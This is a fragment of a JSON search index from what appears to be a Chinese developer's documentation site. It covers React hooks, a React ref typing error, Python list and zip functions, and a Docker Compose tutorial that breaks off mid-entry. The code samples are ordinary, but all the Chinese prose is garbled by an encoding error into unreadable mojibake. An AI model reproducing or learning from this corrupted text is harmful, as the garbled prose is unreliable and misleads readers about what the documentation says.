è‡ªå®šä¹‰çš„useWidthï¼Œå®æ—¶è·å–å±å¹•å®½åº¦ å¦å¤–ï¼Œå¾ˆé‡è¦çš„å‡ ç‚¹æç¤ºï¼š hookåœ¨å„ä¸ªç»„ä»¶ä¸­çš„stateçŠ¶æ€æ˜¯éš”ç¦»çš„ï¼Œè¿™ä¸ªè·Ÿjså‡½æ•°çš„æ¦‚å¿µæ˜¯ä¸€è‡´çš„ï¼› React Hooksä¸æ˜¯ç”¨æ¥åœ¨å¤šç»„ä»¶ä¸­å¤ç”¨çŠ¶æ€ï¼Œè€Œæ˜¯åœ¨å¤šç»„ä»¶ä¸­å¤ç”¨çŠ¶æ€é€»è¾‘ï¼›","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-react-hooks-Custom-HOOK.html","loc":"/yq-doc-source-docs-front-end-frame-react-hooks-Custom-HOOK.html"},{"title":"useEffect","text":"ä¸ºç»„ä»¶æ·»åŠ å‰¯ä½œç”¨çš„æ“ä½œ æ¯”å¦‚ï¼Œæ¯æ¬¡æ¸²æŸ“ä¹‹åï¼Œä¿®æ”¹ç½‘ç«™çš„æ ‡é¢˜: function Example() { const [count, setCount] = useState(0); useEffect(() => { document.title = `You clicked ${count} times`; }); } è§‰å¾—æ¯æ¬¡æ¸²æŸ“éƒ½æ‰§è¡Œå¼€é”€å¤ªå¤§, è¿˜å¯ä»¥ä»…åœ¨countæ›´æ–°çš„æ—¶å€™æ‰§è¡Œ(ä½¿ç”¨ç¬¬äºŒä¸ªå‚æ•°å³å¯): useEffect(() => { document.title = `You clicked ${count} times`; }, [count]); è¡¨ç¤ºåªæœ‰å½“countå˜åŒ–çš„æ—¶å€™ï¼Œé‡æ–°æ‰§è¡Œå‰¯ä½œç”¨ æœ‰æ—¶å€™æˆ‘ä»¬ä¼šå¸Œæœ›useEffectåªåœ¨ç¬¬ä¸€æ¬¡æ¸²æŸ“æ—¶å€™æ‰§è¡Œä¸€æ¬¡ï¼Œ ä¾‹å¦‚ componentDidMount ï¼Œç¬¬äºŒä¸ªå‚æ•°è®¾ç½®æˆç©ºæ•°ç»„: useEffect(() => { console.log('ç»„ä»¶Mounted'); }, []); æ³¨è§£ å¯ä»¥ä½¿ç”¨å¤šä¸ª useEffect ä½œä¸ºä¸åŒçš„ hooks è®©é€»è¾‘åˆ†ç¦» å¦‚æœéœ€è¦æ¶ˆé™¤ effect , è¿”å›å‡½æ•°å³å¯","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-react-hooks-useeffect.html","loc":"/yq-doc-source-docs-front-end-frame-react-hooks-useeffect.html"},{"title":"useState","text":"ä¸ºç»„ä»¶æ·»åŠ  State ä¾‹å­: import React, { useState } from 'react'; function Example() { // å£°æ˜ä¸€ä¸ªstate count const [count, setCount] = useState(0); // ä½¿ç”¨countè¿›è¡Œæ¸²æŸ“ï¼Œå¹¶ç»‘å®šç‚¹å‡»æ—¶é—´ï¼Œä½¿count+1 return ( <div> <p>You clicked {count} times</p> <button onClick={() => setCount(count + 1)}> Click me </button> </div> ); } æ³¨è§£ å½“æœ‰å¤šä¸ªstateæ—¶ï¼Œä½¿ç”¨å¤šä¸ªstateå˜é‡ï¼Œè€Œä¸æ˜¯ä¸€ä¸ª, è¿™æ ·æŠŠæ— å…³é€»è¾‘åˆ†ç¦»ï¼Œä¾¿äºå¢åˆ æ”¹state","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-react-hooks-usestate.html","loc":"/yq-doc-source-docs-front-end-frame-react-hooks-usestate.html"},{"title":"refç±»å‹ä¸åŒ¹é…","text":"å¤§è‡´æŠ¥é”™ä¿¡æ¯: MutableRefObject<SelectComponent | undefined> is not assignable to type Ref<SelectComponent> | undefined æˆ–è€…: Type ForwardedRef<unknown> is not assignable to type LegacyRef<SelectComponent> | undefined åŸå› : åœ¨ React ä¸­ï¼Œref å¯ä»¥æ˜¯ä¸¤ç§ç±»å‹ä¹‹ä¸€ï¼šLegacyRef æˆ– MutableRefObjectã€‚ LegacyRef æ˜¯ä¸€ä¸ªæ—§ç‰ˆæœ¬çš„ ref ç±»å‹ï¼Œé€‚ç”¨äºç±»ç»„ä»¶å’Œå‡½æ•°ç»„ä»¶ã€‚ MutableRefObject æ˜¯ä¸€ä¸ªè¾ƒæ–°çš„ ref ç±»å‹ï¼Œé€‚ç”¨äºå‡½æ•°ç»„ä»¶å’Œ React Hooksã€‚ å¦‚æœä½ åœ¨å‡½æ•°ç»„ä»¶ä¸­ä½¿ç”¨ useRef() åˆ›å»º refï¼Œé‚£ä¹ˆä½ å¾—åˆ°çš„æ˜¯ MutableRefObject ç±»å‹çš„å¯¹è±¡ã€‚ ä½†æ˜¯ï¼Œç±»ç»„ä»¶ä¸­çš„ ref åº”è¯¥æ˜¯ LegacyRef ç±»å‹ã€‚ è¿™ä¸ªæ—¶å€™éœ€è¦å°†å…¶è½¬æ¢ä¸€ä¸‹, æ¯”å¦‚: import {SelectComponent, SelectComponentProps} from \"@theia/core/lib/browser/widgets/select-component\" import * as React from \"react\"; const ForwardedChildComponent = React.forwardRef((props: SelectComponentProps, ref) => { return <SelectComponent {...props} ref={ref as React.RefObject<SelectComponent>} />; });","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-react-question-Ref-type-does-not-match.html","loc":"/yq-doc-source-docs-front-end-frame-react-question-Ref-type-does-not-match.html"},{"title":"list","text":"index()æ–¹æ³• æ£€æµ‹ å­—ç¬¦ä¸² ä¸­æ˜¯å¦åŒ…å«å­å­—ç¬¦ä¸² strï¼Œå¹¶è¿”å›ç´¢å¼•å€¼ï¼› ä» åˆ—è¡¨ ä¸­æ‰¾å‡ºæŸä¸ªå€¼ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹çš„ç´¢å¼•ä½ç½®ã€‚ list æ±‚äº¤é›†å¹¶é›†å·®é›† ä¸å»ºè®®çš„: # å‡è®¾æœ‰ä¸¤ä¸ªé›†åˆ a,b # äº¤é›† [val for val in a if val in b] # å¹¶é›† list(set(a+b)) # å·®é›† [val for val in b if val not in a] # bä¸­æœ‰è€Œaä¸­æ²¡æœ‰çš„ å»ºè®®çš„é«˜æ•ˆçš„: # å‡è®¾æœ‰ä¸¤ä¸ªé›†åˆ a,b # äº¤é›† list(set(a).intersection(set(b))) # å¹¶é›† list(set(a).union(set(b))) # å·®é›† list(set(b).difference(set(a))) # bä¸­æœ‰è€Œaä¸­æ²¡æœ‰çš„ è§ /docs/åç«¯/python/å†…ç½®å‡½æ•°/set æ±‚å…¶ä¸­æŸå€¼çš„ä¸ªæ•° ä½¿ç”¨ count, å¦‚: In [23]: [1, 2, 3].count(3) Out[23]: 1","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-list.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-list.html"},{"title":"zip","text":"æ³¨è§£ ç›¸ä¼¼çš„å‡½æ•°è§ /docs/åç«¯/python/pythonæ ‡å‡†åº“/itertools çš„ zip_longest <Python_zip_longest> zip() å‡½æ•°ç”¨äºå°†å¯è¿­ä»£çš„å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œå°†å¯¹è±¡ä¸­å¯¹åº”çš„å…ƒç´ æ‰“åŒ…æˆä¸€ä¸ªä¸ªå…ƒç»„ï¼Œç„¶åè¿”å›ç”±è¿™äº›å…ƒç»„ç»„æˆçš„åˆ—è¡¨ã€‚ zip æ–¹æ³•åœ¨ Python 2 å’Œ Python 3 ä¸­çš„ä¸åŒï¼š åœ¨ Python 3.x ä¸­ä¸ºäº†å‡å°‘å†…å­˜ï¼Œzip() è¿”å›çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ã€‚å¦‚éœ€å±•ç¤ºåˆ—è¡¨ï¼Œéœ€æ‰‹åŠ¨ list() è½¬æ¢ã€‚ å¦‚æœå„ä¸ªè¿­ä»£å™¨çš„å…ƒç´ ä¸ªæ•°ä¸ä¸€è‡´ï¼Œåˆ™è¿”å›åˆ—è¡¨é•¿åº¦ä¸æœ€çŸ­çš„å¯¹è±¡ç›¸åŒï¼Œåˆ©ç”¨ * å·æ“ä½œç¬¦ï¼Œå¯ä»¥å°†å…ƒç»„è§£å‹ä¸ºåˆ—è¡¨: >>> a = [1,2,3] >>> b = [4,5,6] >>> c = [4,5,6,7,8] >>> zipped = zip(a,b) # è¿”å›ä¸€ä¸ªå¯¹è±¡ >>> zipped <zip object at 0x103abc288> >>> list(zipped) # list() è½¬æ¢ä¸ºåˆ—è¡¨ [(1, 4), (2, 5), (3, 6)] >>> list(zip(a,c)) # å…ƒç´ ä¸ªæ•°ä¸æœ€çŸ­çš„åˆ—è¡¨ä¸€è‡´ [(1, 4), (2, 5), (3, 6)] >>> a1, a2 = zip(*zip(a,b)) # ä¸ zip ç›¸åï¼Œzip(*) å¯ç†è§£ä¸ºè§£å‹ï¼Œè¿”å›äºŒç»´çŸ©é˜µå¼ >>> list(a1) [1, 2, 3] >>> list(a2) [4, 5, 6] >>>","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-zip.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-zip.html"},{"title":"Docker Compose","text":"ç®€ä»‹ Compose æ˜¯ç”¨äºå®šä¹‰å’Œè¿è¡Œå¤šå®¹å™¨ Docker åº”ç”¨ç¨‹åºçš„å·¥å…·ã€‚ é€šè¿‡ Composeï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ YML æ–‡ä»¶æ¥é…ç½®åº”ç”¨ç¨‹åºéœ€è¦çš„æ‰€æœ‰æœåŠ¡ã€‚ ç„¶åï¼Œä½¿ç”¨ä¸€ä¸ªå‘½ä»¤ï¼Œå°±å¯ä»¥ä» YML æ–‡ä»¶é…ç½®ä¸­åˆ›å»ºå¹¶å¯åŠ¨æ‰€æœ‰æœåŠ¡ã€‚ Compose ä½¿ç”¨çš„ä¸‰ä¸ªæ­¥éª¤ï¼š ä½¿ç”¨ Dockerfile å®šä¹‰åº”ç”¨ç¨‹åºçš„ç¯å¢ƒã€‚ ä½¿ç”¨ docker-compose.yml å®šä¹‰æ„æˆåº”ç”¨ç¨‹åºçš„æœåŠ¡ï¼Œè¿™æ ·å®ƒä»¬å¯ä»¥åœ¨éš”ç¦»ç¯å¢ƒä¸­ä¸€èµ·è¿è¡Œã€‚ æœ€åï¼Œæ‰§è¡Œ docker-compose up å‘½ä»¤æ¥å¯åŠ¨å¹¶è¿è¡Œæ•´ä¸ªåº”ç”¨ç¨‹åºã€‚ å¦‚: # yaml é…ç½®å®ä¾‹ version: '3' services: web: build: . ports: - \"5000:5000\" volumes: - .:/code - logvolume01:/var/log links: - redis redis: image: redis volumes: logvolume01: {} å®‰è£… å¯ä»¥ç›´æ¥å» github ä¸‹è½½: https://github.com/docker/compose/releases å…¶å®ç°åœ¨, å¦‚æœæ˜¯æ¡Œé¢ç«¯, æ¯”å¦‚MacOS, å®‰è£…çš„ docker å›¾å½¢ç•Œé¢å°±è‡ªå¸¦ docker-compose: ll /usr/local/bin/docker-compose lrwxr-xr-x@ 1 yanque admin 62B Dec 6 2022 /usr/local/bin/docker-compose -> /Applications/Docker.app/Contents/Resources/bin/docker-compose å‡†å¤‡ åˆ›å»ºä¸€ä¸ªç®€å•çš„ flask åº”ç”¨: $ mkdir composetest $ cd composetest åœ¨æµ‹è¯•ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªåä¸º app.py çš„æ–‡ä»¶ï¼Œå¹¶å¤åˆ¶ç²˜è´´ä»¥ä¸‹å†…å®¹: import time import redis from flask import Flask app = Flask(__name__) cache = redis.Redis(host='redis', port=6379) def get_hit_count(): retries = 5 while True: try: return cache.incr('hits') except redis.exceptions.ConnectionError as exc: if retries == 0: raise exc retries -= 1 time.sleep(0.5) @app.route('/') def hello(): count = get_hit_count() return 'Hello World! I have been seen {} times.\\n'.format(count) åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œredis æ˜¯åº”ç”¨ç¨‹åºç½‘ç»œä¸Šçš„ redis å®¹å™¨çš„ä¸»æœºåï¼Œè¯¥ä¸»æœºä½¿ç”¨çš„ç«¯å£ä¸º 6379ã€‚ åœ¨ composetest ç›®å½•ä¸­åˆ›å»ºå¦ä¸€ä¸ªåä¸º requirements.txt çš„æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹: flask redis åˆ›å»º dockerfile è¯´æ˜è§ /docs/å®¹å™¨ä¸é›†ç¾¤/docker/dockerfileç¼–å†™ å½“å‰æµ‹è¯•å†…å®¹: FROM python:3.7-alpine WORKDIR /code ENV FLASK_APP app.py ENV FLASK_RUN_HOST 0.0.0.0 RUN apk add --no-cache gcc musl-dev linux-headers COPY requirements.txt requirements.txt RUN pip install -r requirements.txt COPY . . CMD [\"flask\", \"run\"] è§£é‡Š FROM python:3.7-alpine: ä» Python 3.7 æ˜ åƒå¼€å§‹æ„å»ºé•œåƒã€‚ WORKDIR /code: å°†å·¥ä½œç›®å½•è®¾ç½®ä¸º /codeã€‚ ENV FLASK_APP app.py ENV FLASK_RUN_HOST 0.0.0.0 è®¾ç½® flask å‘½ä»¤ä½¿ç”¨çš„ç¯å¢ƒå˜é‡ã€‚ RUN apk add --no-cache gcc musl-dev linux-headers: å®‰è£… gccï¼Œä»¥ä¾¿è¯¸å¦‚ MarkupSafe å’Œ SQLAlchemy ä¹‹ç±»çš„ Python åŒ…å¯ä»¥ç¼–è¯‘åŠ é€Ÿã€‚ COPY requirements.txt requirements.txt RUN pip install -r requirements.txt å¤åˆ¶ requirements.txt å¹¶å®‰è£… Python ä¾èµ–é¡¹ã€‚ COPY . .: å°† . é¡¹ç›®ä¸­çš„å½“å‰ç›®å½•å¤åˆ¶åˆ° . é•œåƒä¸­çš„å·¥ä½œç›®å½•ã€‚ CMD [\"flask\", \"run\"]: å®¹å™¨æä¾›é»˜è®¤çš„æ‰§è¡Œå‘½ä»¤ä¸ºï¼šflask runã€‚ åˆ›å»º docker-compose.yml åœ¨æµ‹è¯•ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªåä¸º docker-compose.yml çš„æ–‡ä»¶ï¼Œç„¶åç²˜è´´ä»¥ä¸‹å†…å®¹: # yaml é…ç½® version: '3' services: web: build: . ports: - \"5000:5000\" redis: image: \"redis:alpine\" è¯¥ Compose æ–‡ä»¶å®šä¹‰äº†ä¸¤ä¸ªæœåŠ¡ï¼šweb å’Œ redisã€‚ webï¼šè¯¥ web æœåŠ¡ä½¿ç”¨ä» Dockerfile å½“å‰ç›®å½•ä¸­æ„å»ºçš„é•œåƒã€‚ç„¶åï¼Œå®ƒå°†å®¹å™¨å’Œä¸»æœºç»‘å®šåˆ°æš´éœ²çš„ç«¯å£ 5000ã€‚æ­¤ç¤ºä¾‹æœåŠ¡ä½¿ç”¨ Flask Web æœåŠ¡å™¨çš„é»˜è®¤ç«¯å£ 5000 ã€‚ redisï¼šè¯¥ redis æœåŠ¡ä½¿ç”¨ Docker Hub çš„å…¬å…± Redis æ˜ åƒã€‚ ä½¿ç”¨ Compose å‘½ä»¤æ„å»ºå’Œè¿è¡Œæ‚¨çš„åº”ç”¨ åœ¨æµ‹è¯•ç›®å½•ä¸­ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥å¯åŠ¨åº”ç”¨ç¨‹åº: docker-compose up å¦‚æœä½ æƒ³åœ¨åå°æ‰§è¡Œè¯¥æœåŠ¡å¯ä»¥åŠ ä¸Š -d å‚æ•°: docker-compose up -d yml é…ç½®æŒ‡ä»¤å‚è€ƒ version æŒ‡å®šæœ¬ yml ä¾ä»çš„ compose å“ªä¸ªç‰ˆæœ¬åˆ¶å®šçš„ã€‚ build æŒ‡å®šä¸ºæ„å»ºé•œåƒä¸Šä¸‹æ–‡è·¯å¾„ï¼š ä¾‹å¦‚ webapp æœåŠ¡ï¼ŒæŒ‡å®šä¸ºä»ä¸Šä¸‹æ–‡è·¯å¾„ ./dir/Dockerfile æ‰€æ„å»ºçš„é•œåƒ: version: \"3.7\" services: webapp: build: ./dir æˆ–è€…ï¼Œä½œä¸ºå…·æœ‰åœ¨ä¸Šä¸‹æ–‡æŒ‡å®šçš„è·¯å¾„çš„å¯¹è±¡ï¼Œä»¥åŠå¯é€‰çš„ Dockerfile å’Œ args: version: \"3.7\" services: webapp: build: context: ./dir dockerfile: Dockerfile-alternate args: buildno: 1 labels: - \"com.example.description=Accounting webapp\" - \"com.example.department=Finance\" - \"com.example.label-with-empty-value\" target: prod contextï¼šä¸Šä¸‹æ–‡è·¯å¾„ã€‚ dockerfileï¼šæŒ‡å®šæ„å»ºé•œåƒçš„ Dockerfile æ–‡ä»¶åã€‚ argsï¼šæ·»åŠ æ„å»ºå‚æ•°ï¼Œè¿™æ˜¯åªèƒ½åœ¨æ„å»ºè¿‡ç¨‹ä¸­è®¿é—®çš„ç¯å¢ƒå˜é‡ã€‚ labelsï¼šè®¾ç½®æ„å»ºé•œåƒçš„æ ‡ç­¾ã€‚ targetï¼šå¤šå±‚æ„å»ºï¼Œå¯ä»¥æŒ‡å®šæ„å»ºå“ªä¸€å±‚ã€‚ cap_addï¼Œcap_drop æ·»åŠ æˆ–åˆ é™¤å®¹å™¨æ‹¥æœ‰çš„å®¿ä¸»æœºçš„å†…æ ¸åŠŸèƒ½ã€‚ cap_add: ALL # å¼€å¯å…¨éƒ¨æƒé™ cap_drop: SYS_PTRACE # å…³é—­ ptraceæƒé™ cgroup_parent ä¸ºå®¹å™¨æŒ‡å®šçˆ¶ cgroup ç»„ï¼Œæ„å‘³ç€å°†ç»§æ‰¿è¯¥ç»„çš„èµ„æºé™åˆ¶: cgroup_parent: m-executor-abcd command è¦†ç›–å®¹å™¨å¯åŠ¨çš„é»˜è®¤å‘½ä»¤: command: [\"bundle\", \"exec\", \"thin\", \"-p\", \"3000\"] container_name æŒ‡å®šè‡ªå®šä¹‰å®¹å™¨åç§°ï¼Œè€Œä¸æ˜¯ç”Ÿæˆçš„é»˜è®¤åç§°: container_name: my-web-container depends_on è®¾ç½®ä¾èµ–å…³ç³»ã€‚ docker-compose up ï¼šä»¥ä¾èµ–æ€§é¡ºåºå¯åŠ¨æœåŠ¡ã€‚åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œå…ˆå¯åŠ¨ db å’Œ redis ï¼Œæ‰ä¼šå¯åŠ¨ webã€‚ docker-compose up SERVICE ï¼šè‡ªåŠ¨åŒ…å« SERVICE çš„ä¾èµ–é¡¹ã€‚åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œdocker-compose up web è¿˜å°†åˆ›å»ºå¹¶å¯åŠ¨ db å’Œ redisã€‚ docker-compose stop ï¼šæŒ‰ä¾èµ–å…³ç³»é¡ºåºåœæ­¢æœåŠ¡ã€‚åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œweb åœ¨ db å’Œ redis ä¹‹å‰åœæ­¢ã€‚ å¦‚: version: \"3.7\" services: web: build: . depends_on: - db - redis redis: image: redis db: image: postgres æ³¨æ„ï¼šweb æœåŠ¡ä¸ä¼šç­‰å¾… redis db å®Œå…¨å¯åŠ¨ ä¹‹åæ‰å¯åŠ¨ã€‚ deploy æŒ‡å®šä¸æœåŠ¡çš„éƒ¨ç½²å’Œè¿è¡Œæœ‰å…³çš„é…ç½®ã€‚åªåœ¨ swarm æ¨¡å¼ä¸‹æ‰ä¼šæœ‰ç”¨: version: \"3.7\" services: redis: image: redis:alpine deploy: modeï¼šreplicated replicas: 6 endpoint_mode: dnsrr labels: description: \"This redis service label\" resources: limits: cpus: '0.50' memory: 50M reservations: cpus: '0.25' memory: 20M restart_policy: condition: on-failure delay: 5s max_attempts: 3 window: 120s å¯é€‰å‚æ•° endpoint_mode è®¿é—®é›†ç¾¤æœåŠ¡çš„æ–¹å¼: endpoint_mode: vip # Docker é›†ç¾¤æœåŠ¡ä¸€ä¸ªå¯¹å¤–çš„è™šæ‹Ÿ ipã€‚æ‰€æœ‰çš„è¯·æ±‚éƒ½ä¼šé€šè¿‡è¿™ä¸ªè™šæ‹Ÿ ip åˆ°è¾¾é›†ç¾¤æœåŠ¡å†…éƒ¨çš„æœºå™¨ã€‚ endpoint_mode: dnsrr # DNS è½®è¯¢ï¼ˆDNSRRï¼‰ã€‚æ‰€æœ‰çš„è¯·æ±‚ä¼šè‡ªåŠ¨è½®è¯¢è·å–åˆ°é›†ç¾¤ ip åˆ—è¡¨ä¸­çš„ä¸€ä¸ª ip åœ°å€ã€‚ labels åœ¨æœåŠ¡ä¸Šè®¾ç½®æ ‡ç­¾ã€‚å¯ä»¥ç”¨å®¹å™¨ä¸Šçš„ labelsï¼ˆè·Ÿ deploy åŒçº§çš„é…ç½®ï¼‰ è¦†ç›– deploy ä¸‹çš„ labelsã€‚ modeï¼šæŒ‡å®šæœåŠ¡æä¾›çš„æ¨¡å¼ã€‚ replicatedï¼šå¤åˆ¶æœåŠ¡ï¼Œå¤åˆ¶æŒ‡å®šæœåŠ¡åˆ°é›†ç¾¤çš„æœºå™¨ä¸Šã€‚ globalï¼šå…¨å±€æœåŠ¡ï¼ŒæœåŠ¡å°†éƒ¨ç½²è‡³é›†ç¾¤çš„æ¯ä¸ªèŠ‚ç‚¹ã€‚ å›¾è§£ï¼šä¸‹å›¾ä¸­é»„è‰²çš„æ–¹å—æ˜¯ replicated æ¨¡å¼çš„è¿è¡Œæƒ…å†µï¼Œç°è‰²æ–¹å—æ˜¯ global æ¨¡å¼çš„è¿è¡Œæƒ…å†µã€‚ replicas mode ä¸º replicated æ—¶ï¼Œéœ€è¦ä½¿ç”¨æ­¤å‚æ•°é…ç½®å…·ä½“è¿è¡Œçš„èŠ‚ç‚¹æ•°é‡ã€‚ resources é…ç½®æœåŠ¡å™¨èµ„æºä½¿ç”¨çš„é™åˆ¶ï¼Œä¾‹å¦‚ä¸Šä¾‹å­ï¼Œé…ç½® redis é›†ç¾¤è¿è¡Œéœ€è¦çš„ cpu çš„ç™¾åˆ†æ¯” å’Œ å†…å­˜çš„å ç”¨ã€‚é¿å…å ç”¨èµ„æºè¿‡é«˜å‡ºç°å¼‚å¸¸ã€‚ restart_policy é…ç½®å¦‚ä½•åœ¨é€€å‡ºå®¹å™¨æ—¶é‡æ–°å¯åŠ¨å®¹å™¨ã€‚ conditionï¼šå¯é€‰ noneï¼Œon-failure æˆ–è€… anyï¼ˆé»˜è®¤å€¼ï¼šanyï¼‰ã€‚ delayï¼šè®¾ç½®å¤šä¹…ä¹‹åé‡å¯ï¼ˆé»˜è®¤å€¼ï¼š0ï¼‰ã€‚ max_attemptsï¼šå°è¯•é‡æ–°å¯åŠ¨å®¹å™¨çš„æ¬¡æ•°ï¼Œè¶…å‡ºæ¬¡æ•°ï¼Œåˆ™ä¸å†å°è¯•ï¼ˆé»˜è®¤å€¼ï¼šä¸€ç›´é‡è¯•ï¼‰ã€‚ windowï¼šè®¾ç½®å®¹å™¨é‡å¯è¶…æ—¶æ—¶é—´ï¼ˆé»˜è®¤å€¼ï¼š0ï¼‰ã€‚ rollback_config é…ç½®åœ¨æ›´æ–°å¤±è´¥çš„æƒ…å†µä¸‹åº”å¦‚ä½•å›æ»šæœåŠ¡ã€‚ parallelismï¼šä¸€æ¬¡è¦å›æ»šçš„å®¹å™¨æ•°ã€‚å¦‚æœè®¾ç½®ä¸º0ï¼Œåˆ™æ‰€æœ‰å®¹å™¨å°†åŒæ—¶å›æ»šã€‚ delayï¼šæ¯ä¸ªå®¹å™¨ç»„å›æ»šä¹‹é—´ç­‰å¾…çš„æ—¶é—´ï¼ˆé»˜è®¤ä¸º0sï¼‰ã€‚ failure_actionï¼šå¦‚æœå›æ»šå¤±è´¥ï¼Œè¯¥æ€ä¹ˆåŠã€‚å…¶ä¸­ä¸€ä¸ª continue æˆ–è€… pauseï¼ˆé»˜è®¤pauseï¼‰ã€‚ monitorï¼šæ¯ä¸ªå®¹å™¨æ›´æ–°åï¼ŒæŒç»­è§‚å¯Ÿæ˜¯å¦å¤±è´¥äº†çš„æ—¶é—´ (ns|us|ms|s|m|h)ï¼ˆé»˜è®¤ä¸º0sï¼‰ã€‚ max_failure_ratioï¼šåœ¨å›æ»šæœŸé—´å¯ä»¥å®¹å¿çš„æ•…éšœç‡ï¼ˆé»˜è®¤ä¸º0ï¼‰ã€‚ orderï¼šå›æ»šæœŸé—´çš„æ“ä½œé¡ºåºã€‚å…¶ä¸­ä¸€ä¸ª stop-firstï¼ˆä¸²è¡Œå›æ»šï¼‰ï¼Œæˆ–è€… start-firstï¼ˆå¹¶è¡Œå›æ»šï¼‰ï¼ˆé»˜è®¤ stop-first ï¼‰ã€‚ update_config é…ç½®åº”å¦‚ä½•æ›´æ–°æœåŠ¡ï¼Œå¯¹äºé…ç½®æ»šåŠ¨æ›´æ–°å¾ˆæœ‰ç”¨ã€‚ parallelismï¼šä¸€æ¬¡æ›´æ–°çš„å®¹å™¨æ•°ã€‚ delayï¼šåœ¨æ›´æ–°ä¸€ç»„å®¹å™¨ä¹‹é—´ç­‰å¾…çš„æ—¶é—´ã€‚ failure_actionï¼šå¦‚æœæ›´æ–°å¤±è´¥ï¼Œè¯¥æ€ä¹ˆåŠã€‚å…¶ä¸­ä¸€ä¸ª continueï¼Œrollback æˆ–è€…pause ï¼ˆé»˜è®¤ï¼špauseï¼‰ã€‚ monitorï¼šæ¯ä¸ªå®¹å™¨æ›´æ–°åï¼ŒæŒç»­è§‚å¯Ÿæ˜¯å¦å¤±è´¥äº†çš„æ—¶é—´ (ns|us|ms|s|m|h)ï¼ˆé»˜è®¤ä¸º0sï¼‰ã€‚ max_failure_ratioï¼šåœ¨æ›´æ–°è¿‡ç¨‹ä¸­å¯ä»¥å®¹å¿çš„æ•…éšœç‡ã€‚ orderï¼šå›æ»šæœŸé—´çš„æ“ä½œé¡ºåºã€‚å…¶ä¸­ä¸€ä¸ª stop-firstï¼ˆä¸²è¡Œå›æ»šï¼‰ï¼Œæˆ–è€… start-firstï¼ˆå¹¶è¡Œå›æ»šï¼‰ï¼ˆé»˜è®¤stop-firstï¼‰ã€‚ æ³¨ï¼šä»…æ”¯æŒ V3.4 åŠæ›´é«˜ç‰ˆæœ¬ã€‚ devices æŒ‡å®šè®¾å¤‡æ˜ å°„åˆ—è¡¨: devices: - \"/dev/ttyUSB0:/dev/ttyUSB0\" dns è‡ªå®šä¹‰ DNS æœåŠ¡å™¨ï¼Œå¯ä»¥æ˜¯å•ä¸ªå€¼æˆ–åˆ—è¡¨çš„å¤šä¸ªå€¼: dns: 8.8.8.8 dns: - 8.8.8.8 - 9.9.9.9 dns_search è‡ªå®šä¹‰ DNS æœç´¢åŸŸã€‚å¯ä»¥æ˜¯å•ä¸ªå€¼æˆ–åˆ—è¡¨: dns_search: example.com dns_search: - dc1.example.com - dc2.example.com entrypoint è¦†ç›–å®¹å™¨é»˜è®¤çš„ entrypoint: entrypoint: /code/entrypoint.sh ä¹Ÿå¯ä»¥æ˜¯ä»¥ä¸‹æ ¼å¼: entrypoint: - php - -d - zend_extension=/usr/local/lib/php/extensions/no-debug-non-zts-20100525/xdebug.so - -d - memory_limit=-1 - vendor/bin/phpunit env_file ä»æ–‡ä»¶æ·»åŠ ç¯å¢ƒå˜é‡ã€‚å¯ä»¥æ˜¯å•ä¸ªå€¼æˆ–åˆ—è¡¨çš„å¤šä¸ªå€¼: env_file: .env ä¹Ÿå¯ä»¥æ˜¯åˆ—è¡¨æ ¼å¼: env_file: - ./common.env - ./apps/web.env - /opt/secrets.env environment æ·»åŠ ç¯å¢ƒå˜é‡ã€‚æ‚¨å¯ä»¥ä½¿ç”¨æ•°ç»„æˆ–å­—å…¸ã€ä»»ä½•å¸ƒå°”å€¼ï¼Œ å¸ƒå°”å€¼éœ€è¦ç”¨å¼•å·å¼•èµ·æ¥ï¼Œä»¥ç¡®ä¿ YML è§£æå™¨ä¸ä¼šå°†å…¶è½¬æ¢ä¸º True æˆ– False: environment: RACK_ENV: development SHOW: 'true' expose æš´éœ²ç«¯å£ï¼Œä½†ä¸æ˜ å°„åˆ°å®¿ä¸»æœºï¼Œåªè¢«è¿æ¥çš„æœåŠ¡è®¿é—®ã€‚ ä»…å¯ä»¥æŒ‡å®šå†…éƒ¨ç«¯å£ä¸ºå‚æ•°: expose: - \"3000\" - \"8000\" extra_hosts æ·»åŠ ä¸»æœºåæ˜ å°„ã€‚ç±»ä¼¼ docker client --add-host: extra_hosts: - \"somehost:162.242.195.82\" - \"otherhost:50.31.209.229\" ä»¥ä¸Šä¼šåœ¨æ­¤æœåŠ¡çš„å†…éƒ¨å®¹å™¨ä¸­ /etc/hosts åˆ›å»ºä¸€ä¸ªå…·æœ‰ ip åœ°å€å’Œä¸»æœºåçš„æ˜ å°„å…³ç³»: 162.242.195.82 somehost 50.31.209.229 otherhost healthcheck:: ç”¨äºæ£€æµ‹ docker æœåŠ¡æ˜¯å¦å¥åº·è¿è¡Œ: healthcheck: test: [\"CMD\", \"curl\", \"-f\", \"http://localhost\"] # è®¾ç½®æ£€æµ‹ç¨‹åº interval: 1m30s # è®¾ç½®æ£€æµ‹é—´éš” timeout: 10s # è®¾ç½®æ£€æµ‹è¶…æ—¶æ—¶é—´ retries: 3 # è®¾ç½®é‡è¯•æ¬¡æ•° start_period: 40s # å¯åŠ¨åï¼Œå¤šå°‘ç§’å¼€å§‹å¯åŠ¨æ£€æµ‹ç¨‹åº image æŒ‡å®šå®¹å™¨è¿è¡Œçš„é•œåƒã€‚ä»¥ä¸‹æ ¼å¼éƒ½å¯ä»¥: image: redis image: ubuntu:14.04 image: tutum/influxdb image: example-registry.com:4000/postgresql image: a4bc65fd # é•œåƒid logging 